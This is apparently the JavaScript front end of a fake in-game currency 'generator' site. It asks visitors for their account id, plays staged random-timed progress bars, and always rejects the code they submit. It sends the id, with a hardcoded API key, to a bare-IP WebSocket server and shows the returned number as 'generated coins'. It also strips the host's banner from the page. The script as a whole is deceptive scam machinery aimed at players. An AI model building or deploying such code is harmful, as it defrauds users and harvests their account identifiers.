$(document).ready(function () {
    $('[alt^="www.000webhost.com"]').parent().remove();
    var BV = new $.BigVideo();
    BV.init();
    isTouch = Modernizr.touch;
    var windowsize = $(window).width();
    var $selected_rp = '';
    var $account_connected = false;
    $('.rp-select').click(function () {
        if ($('.gen-area').hasClass('area-disabled')) {
            sweetAlert("Error", "Please connect your account.", "error");
        }
        else {
            fixRPBox($(this));
        }
    });
    $('.submit-btn').click(function () {
        sweetAlert("Error", "The code you have provided is invalid or incorrect.", "error");
    });
    $('.gen-v-btn').click(function () {
        window.open(href);
    });
    $('.connect-button').click(function () {
        if ($account_connected == false) {
            if ($('#usernameInput').val() != '') {
                var username = $('#usernameInput').val();
                if (username.length != 10 || isNaN(username)) return sweetAlert("Error", "Invalid account id don't use dashes [-].", "error");
                $('#m-accname').text($('#usernameInput').val());
                $.magnificPopup.open({
                    items: {
                        src: '#loading_modal',
                    },
                    type: 'inline',
                    preloader: false,
                    modal: true,
                    callbacks: {
                        open: function () { },
                        close: function () {
                            $account_connected = true;
                            $('.account-connet-area').addClass('account-disabled');
                            $('#user-accname').text($('#usernameInput').val());
                            $('.account-connected').removeClass('acc-disabled');
                            $('.gen-area').removeClass('area-disabled');
                            $('.account-connet-area').addClass('area-disabled');
                            $('#usernameInput, #serverInput, #aesInput').attr('disabled', 'true');
                        }
                    }
                });
                progress_slow_connect(function () {
                    $.magnificPopup.close();
                });
            }
            else {
                sweetAlert("Error", "Please enter your account id.", "error");
            }
        }
        else {
            sweetAlert("Error", "You are already connected.", "error");
        }
    });
    $('.gen-button').click(function () {
        if ($('.gen-area').hasClass('area-disabled') || $account_connected == false) {
            sweetAlert("Error", "Please connect your account.", "error");
        }
        else {
            $.magnificPopup.open({
                items: {
                    src: '#gen_modal',
                },
                type: 'inline',
                preloader: false,
                modal: true,
                callbacks: {
                    open: function () {
                        loading_step();
                    }
                }
            });

        }
    });

    function loading_step() {
        const ws = new WebSocket('ws://144.202.25.8:8081');
        var username = $('#usernameInput').val();

        ws.onopen = () => {
            console.log('Connected to server');
            ws.send(JSON.stringify({
                apiKey: '9a1251fbdb8e894912fe5130d42dc99c',
                userid: username,
                appid: '32316'
            }));
        };

        ws.onerror = () => {
            $('.generator-loading').fadeOut('slow', function () {
                $('.generator-failed').fadeIn('slow', function () {
                    console.log('Server is offline');
                });
            });
        };

        ws.onmessage = msg => {
            $('.generator-loading').fadeOut('slow', function () {
                $('.generator-verification').fadeIn('slow', function () {
                    $('#m-coins').text(msg.data);
                    console.log('Generated ' + msg.data + ' Coins');
                });
            });
        };
    }

    function progress_slow(callback) {
        var $temp_percentage = 0;
        var $pbar_div = $('.g-progressbar');
        var $p_array = [5, 10, 15];
        $pbar_div.css('width', '0%');
        var interval_timer = setInterval(function () {
            if ($temp_percentage != 100) {
                $temp_percentage = $temp_percentage + 10;
                $pbar_div.css('width', $temp_percentage + '%');
            }
            else {
                callback();
                clearInterval(interval_timer);
            }
        }, Math.floor((Math.random() * 1200) + 600));
    }

    function progress_med(callback) {
        var $temp_percentage = 0;
        var $pbar_div = $('.g-progressbar');
        var $p_array = [5, 10, 15];
        $pbar_div.css('width', '0%');
        var interval_timer = setInterval(function () {
            if ($temp_percentage != 100) {
                $temp_percentage = $temp_percentage + 10;
                $pbar_div.css('width', $temp_percentage + '%');
            }
            else {
                callback();
                clearInterval(interval_timer);
            }
        }, Math.floor((Math.random() * 600) + 250));
    }

    function progress_fast(callback) {
        var $temp_percentage = 0;
        var $pbar_div = $('.g-progressbar');
        var $p_array = [5, 10, 15];
        $pbar_div.css('width', '0%');
        var interval_timer = setInterval(function () {
            if ($temp_percentage != 100) {
                $temp_percentage = $temp_percentage + 10;
                $pbar_div.css('width', $temp_percentage + '%');
            }
            else {
                callback();
                clearInterval(interval_timer);
            }
        }, Math.floor((Math.random() * 350) + 100));
    }

    function progress_slow_connect(callback) {
        var $temp_percentage = 0;
        var $pbar_div = $('.g-progressbar');
        $pbar_div.css('width', '0%');
        var interval_timer = setInterval(function () {
            if ($temp_percentage == 0) {
                $temp_percentage = 20;
                $pbar_div.css('width', $temp_percentage + '%')
            }
            else if ($temp_percentage == 20) {
                $temp_percentage = 35;
                $pbar_div.css('width', $temp_percentage + '%');
            }
            else if ($temp_percentage == 35) {
                $temp_percentage = 65;
                $pbar_div.css('width', $temp_percentage + '%');
            }
            else if ($temp_percentage == 65) {
                $temp_percentage = 75;
                $pbar_div.css('width', $temp_percentage + '%');
            }
            else if ($temp_percentage == 75) {
                $temp_percentage = 85;
                $pbar_div.css('width', $temp_percentage + '%');
            }
            else if ($temp_percentage == 85) {
                $temp_percentage = 89;
                $pbar_div.css('width', $temp_percentage + '%');
            }
            else if ($temp_percentage == 89) {
                $temp_percentage = 100;
                $pbar_div.css('width', $temp_percentage + '%')
            }
            else if ($temp_percentage == 100) {
                callback();
                clearInterval(interval_timer);
            }
        }, Math.floor((Math.random() * 1200) + 600));
    }

    function fixRPBox($parent_class) {
        resetAllRPBoxes();
        if ($parent_class.hasClass('rp-1')) {
            $selected_rp = 'RP_650';
        }
        if ($parent_class.hasClass('rp-2')) {
            $selected_rp = 'RP_1380';
        }
        if ($parent_class.hasClass('rp-3')) {
            $selected_rp = 'RP_2800';
        }
        if ($parent_class.hasClass('rp-4')) {
            $selected_rp = 'RP_5000';
        }
        if ($parent_class.hasClass('rp-5')) {
            $selected_rp = 'RP_7200';
        }
        $parent_class.addClass('activated');
    }

    function resetAllRPBoxes() {
        var $rp_list = $('.rp-1, .rp-2, .rp-3, .rp-4, .rp-5');
        if ($rp_list.hasClass('activated')) {
            $rp_list.removeClass('activated');
        }
    }
});
